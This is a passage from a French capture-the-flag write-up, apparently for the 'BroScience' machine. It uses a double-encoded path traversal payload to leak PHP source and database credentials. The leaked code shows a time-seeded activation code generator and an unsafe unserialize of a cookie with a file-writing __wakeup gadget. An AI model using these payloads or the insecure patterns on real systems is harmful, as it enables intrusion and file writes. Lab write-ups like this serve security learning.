+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;body class=&#34;&lt;?=get_theme_class($theme)?&gt;&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;?php include_once &#39;includes/navbar.php&#39;; ?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;uk-container uk-margin&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;!-- TODO: Search bar --&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;?php
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            include_once &#39;includes/db_connect.php&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            // Load exercises
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $res = pg_query($db_conn, &#39;SELECT exercises.id, username, title, image, SUBSTRING(content, 1, 100), exercises.date_created, users.id FROM exercises JOIN users ON author_id = users.id&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (pg_num_rows($res) &gt; 0) {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                echo &#39;&lt;div class=&#34;uk-child-width-1-2@s uk-child-width-1-3@m&#34; uk-grid&gt;&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                while ($row = pg_fetch_row($res)) {
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    ?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    &lt;div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &lt;div class=&#34;uk-card uk-card-default &lt;?=(strcmp($theme,&#34;light&#34;))?&#34;uk-card-secondary&#34;:&#34;&#34;?&gt;&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            &lt;div class=&#34;uk-card-media-top&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                &lt;img src=&#34;includes/img.php?path=&lt;?=$row[3]?&gt;&#34; width=&#34;600&#34; height=&#34;600&#34; alt=&#34;&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            &lt;div class=&#34;uk-card-body&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                &lt;a href=&#34;exercise.php?id=&lt;?=$row[0]?&gt;&#34; class=&#34;uk-card-title&#34;&gt;&lt;?=$row[2]?&gt;&lt;/a&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                &lt;p&gt;&lt;?=$row[4]?&gt;... &lt;a href=&#34;exercise.php?id=&lt;?=$row[0]?&gt;&#34;&gt;keep reading&lt;/a&gt;&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            &lt;div class=&#34;uk-card-footer&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                &lt;p class=&#34;uk-text-meta&#34;&gt;Written by &lt;a class=&#34;uk-link-text&#34; href=&#34;user.php?id=&lt;?=$row[6]?&gt;&#34;&gt;&lt;?=htmlspecialchars($row[1],ENT_QUOTES,&#39;UTF-8&#39;)?&gt;&lt;/a&gt; &lt;?=rel_time($row[5])?&gt;&lt;/p&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    &lt;?php
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                }
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                echo &#39;&lt;/div&gt;&#39;;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            } 
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            ?&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;/div&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
+</span></span></span></code></pre></div><p>L&rsquo;index <code>include</code> un <code>db_connect.php</code>, récupérons aussi son contenu.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">?</span>path<span style="color:#f92672">=..%</span><span style="color:#ae81ff">252</span>Fincludes<span style="color:#f92672">%</span><span style="color:#ae81ff">252</span>Fdb_connect<span style="color:#f92672">.</span>php
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$db_host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;localhost&#34;</span>;
+</span></span><span style="display:flex;"><span>$db_port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;5432&#34;</span>;
+</span></span><span style="display:flex;"><span>$db_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;broscience&#34;</span>;
+</span></span><span style="display:flex;"><span>$db_user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dbuser&#34;</span>;
+</span></span><span style="display:flex;"><span>$db_pass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;RangeOfMotion%777&#34;</span>;
+</span></span><span style="display:flex;"><span>$db_salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;NaCl&#34;</span>;
+</span></span></code></pre></div><p>J&rsquo;ai essayé pas mal de choses après ça mais je n&rsquo;ai rien trouvé d&rsquo;utile à faire avec ces identifiants</p>
+<p>Puisque nous sommes &ldquo;bloqués&rdquo;, nous allons tester la dernière fonctionnalité du site: le <code>login</code>/<code>register</code></p>
+<p>Créeons-nous un compte:</p>
+<p><img alt="2023-02-01-195130_810x440_scrot" src="https://user-images.githubusercontent.com/77807503/216157375-0472c36a-4312-4c45-8859-059157f81711.png"></p>
+<p>Il a bel et bien été crée, maintenant connectons nous:</p>
+<p><img alt="2023-02-01-195149_782x309_scrot" src="https://user-images.githubusercontent.com/77807503/216157387-deec7d5e-3a1d-44b0-85d2-6874cf77339a.png"></p>
+<p>Il nous dit que le compte n&rsquo;est pas activé, et bien évidemment, je  n&rsquo;ai reçu aucun email.</p>
+<p>Il va donc falloir trouver un moyen d&rsquo;activer notre compte, commeçons par retourner sur le code de <code>index.php</code>.</p>
+<p>On voit qu&rsquo;il <code>include</code> aussi un fichier appelé <code>utils.php</code>, récupérons son contenu</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">generate_activation_code</span>() {
+</span></span><span style="display:flex;"><span>    $chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">srand</span>(<span style="color:#a6e22e">time</span>());
+</span></span><span style="display:flex;"><span>    $activation_code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; $i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        $activation_code <span style="color:#f92672">=</span> $activation_code <span style="color:#f92672">.</span> $chars[<span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">strlen</span>($chars) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $activation_code;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Source: https://stackoverflow.com/a/4420773 (Slightly adapted)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">rel_time</span>($from, $to <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>    $to <span style="color:#f92672">=</span> (($to <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span>) <span style="color:#f92672">?</span> (<span style="color:#a6e22e">time</span>()) <span style="color:#f92672">:</span> ($to));
+</span></span><span style="display:flex;"><span>    $to <span style="color:#f92672">=</span> ((<span style="color:#a6e22e">is_int</span>($to)) <span style="color:#f92672">?</span> ($to) <span style="color:#f92672">:</span> (<span style="color:#a6e22e">strtotime</span>($to)));
+</span></span><span style="display:flex;"><span>    $from <span style="color:#f92672">=</span> ((<span style="color:#a6e22e">is_int</span>($from)) <span style="color:#f92672">?</span> ($from) <span style="color:#f92672">:</span> (<span style="color:#a6e22e">strtotime</span>($from)));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $units <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>
+</span></span><span style="display:flex;"><span>    (
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;year&#34;</span>   <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">29030400</span>, <span style="color:#75715e">// seconds in a year   (12 months)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#e6db74">&#34;month&#34;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">2419200</span>,  <span style="color:#75715e">// seconds in a month  (4 weeks)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#e6db74">&#34;week&#34;</span>   <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">604800</span>,   <span style="color:#75715e">// seconds in a week   (7 days)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#e6db74">&#34;day&#34;</span>    <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">86400</span>,    <span style="color:#75715e">// seconds in a day    (24 hours)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#e6db74">&#34;hour&#34;</span>   <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">3600</span>,     <span style="color:#75715e">// seconds in an hour  (60 minutes)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#e6db74">&#34;minute&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">60</span>,       <span style="color:#75715e">// seconds in a minute (60 seconds)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#e6db74">&#34;second&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">1</span>         <span style="color:#75715e">// 1 second
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $diff <span style="color:#f92672">=</span> <span style="color:#a6e22e">abs</span>($from <span style="color:#f92672">-</span> $to);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($diff <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Just now&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $suffix <span style="color:#f92672">=</span> (($from <span style="color:#f92672">&gt;</span> $to) <span style="color:#f92672">?</span> (<span style="color:#e6db74">&#34;from now&#34;</span>) <span style="color:#f92672">:</span> (<span style="color:#e6db74">&#34;ago&#34;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $unitCount <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span>($units <span style="color:#66d9ef">as</span> $unit <span style="color:#f92672">=&gt;</span> $mult)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>($diff <span style="color:#f92672">&gt;=</span> $mult <span style="color:#f92672">&amp;&amp;</span> $unitCount <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>            $unitCount <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// $and = (($mult != 1) ? (&#34;&#34;) : (&#34;and &#34;));
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            $and <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>            $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;, &#34;</span><span style="color:#f92672">.</span>$and<span style="color:#f92672">.</span><span style="color:#a6e22e">intval</span>($diff <span style="color:#f92672">/</span> $mult)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">.</span>$unit<span style="color:#f92672">.</span>((<span style="color:#a6e22e">intval</span>($diff <span style="color:#f92672">/</span> $mult) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">?</span> (<span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">:</span> (<span style="color:#e6db74">&#34;s&#34;</span>));
+</span></span><span style="display:flex;"><span>            $diff <span style="color:#f92672">-=</span> <span style="color:#a6e22e">intval</span>($diff <span style="color:#f92672">/</span> $mult) <span style="color:#f92672">*</span> $mult;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">.</span>$suffix;
+</span></span><span style="display:flex;"><span>    $output <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($output, <span style="color:#a6e22e">strlen</span>(<span style="color:#e6db74">&#34;, &#34;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $output;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">UserPrefs</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $theme;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($theme <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;light&#34;</span>) {
+</span></span><span style="display:flex;"><span>		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">theme</span> <span style="color:#f92672">=</span> $theme;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_theme</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;id&#39;</span>])) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_COOKIE[<span style="color:#e6db74">&#39;user-prefs&#39;</span>])) {
+</span></span><span style="display:flex;"><span>            $up_cookie <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">UserPrefs</span>()));
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#39;user-prefs&#39;</span>, $up_cookie);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $up_cookie <span style="color:#f92672">=</span> $_COOKIE[<span style="color:#e6db74">&#39;user-prefs&#39;</span>];
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        $up <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">base64_decode</span>($up_cookie));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $up<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">theme</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;light&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_theme_class</span>($theme <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($theme)) {
+</span></span><span style="display:flex;"><span>        $theme <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_theme</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>($theme, <span style="color:#e6db74">&#34;light&#34;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;uk-light&#34;</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;uk-dark&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">set_theme</span>($val) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;id&#39;</span>])) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#39;user-prefs&#39;</span>,<span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">UserPrefs</span>($val))));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Avatar</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $imgPath;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($imgPath) {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">imgPath</span> <span style="color:#f92672">=</span> $imgPath;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">save</span>($tmp) {
+</span></span><span style="display:flex;"><span>        $f <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">imgPath</span>, <span style="color:#e6db74">&#34;w&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fwrite</span>($f, <span style="color:#a6e22e">file_get_contents</span>($tmp));
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fclose</span>($f);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AvatarInterface</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $tmp;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $imgPath; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup() {
+</span></span><span style="display:flex;"><span>        $a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Avatar</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">imgPath</span>);
+</span></span><span style="display:flex;"><span>        $a<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">save</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tmp</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>On voit une fonction <code>generate_activation_code()</code> qui semble générer un code d&rsquo;activation qui nous est nécessaire pour <strong>activer notre compte</strong></p>
+<p>Nous savons comment créer un code d&rsquo;activation mais nous ne savons pas où l&rsquo;utiliser, cette informations se trouve probablement dans le <code>register.php</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Check if user is logged in already
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;id&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: /index.php&#39;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Handle a submitted register form
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;email&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;password-confirm&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Check if variables are empty
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;email&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;password-confirm&#39;</span>])) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Check if passwords match
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>($_POST[<span style="color:#e6db74">&#39;password&#39;</span>], $_POST[<span style="color:#e6db74">&#39;password-confirm&#39;</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Check if email is too long
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($_POST[<span style="color:#e6db74">&#39;email&#39;</span>]) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">100</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// Check if email is valid
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">filter_var</span>($_POST[<span style="color:#e6db74">&#39;email&#39;</span>], <span style="color:#a6e22e">FILTER_VALIDATE_EMAIL</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">// Check if username is valid
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>]) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">100</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e">// Check if user exists already    
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        <span style="color:#66d9ef">include_once</span> <span style="color:#e6db74">&#39;includes/db_connect.php&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_prepare</span>($db_conn, <span style="color:#e6db74">&#34;check_username_query&#34;</span>, <span style="color:#e6db74">&#39;SELECT id FROM users WHERE username = $1&#39;</span>);
+</span></span><span style="display:flex;"><span>                        $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_execute</span>($db_conn, <span style="color:#e6db74">&#34;check_username_query&#34;</span>, <span style="color:#66d9ef">array</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>]));
+</span></span><span style="display:flex;"><span>                        
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pg_num_rows</span>($res) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                            <span style="color:#75715e">// Check if email is registered already
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                            $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_prepare</span>($db_conn, <span style="color:#e6db74">&#34;check_email_query&#34;</span>, <span style="color:#e6db74">&#39;SELECT id FROM users WHERE email = $1&#39;</span>);
+</span></span><span style="display:flex;"><span>                            $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_execute</span>($db_conn, <span style="color:#e6db74">&#34;check_email_query&#34;</span>, <span style="color:#66d9ef">array</span>($_POST[<span style="color:#e6db74">&#39;email&#39;</span>]));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pg_num_rows</span>($res) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                                <span style="color:#75715e">// Create the account
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                <span style="color:#66d9ef">include_once</span> <span style="color:#e6db74">&#39;includes/utils.php&#39;</span>;
+</span></span><span style="display:flex;"><span>                                $activation_code <span style="color:#f92672">=</span> <span style="color:#a6e22e">generate_activation_code</span>();
+</span></span><span style="display:flex;"><span>                                $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_prepare</span>($db_conn, <span style="color:#e6db74">&#34;check_code_unique_query&#34;</span>, <span style="color:#e6db74">&#39;SELECT id FROM users WHERE activation_code = $1&#39;</span>);
+</span></span><span style="display:flex;"><span>                                $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_execute</span>($db_conn, <span style="color:#e6db74">&#34;check_code_unique_query&#34;</span>, <span style="color:#66d9ef">array</span>($activation_code));
+</span></span><span style="display:flex;"><span>
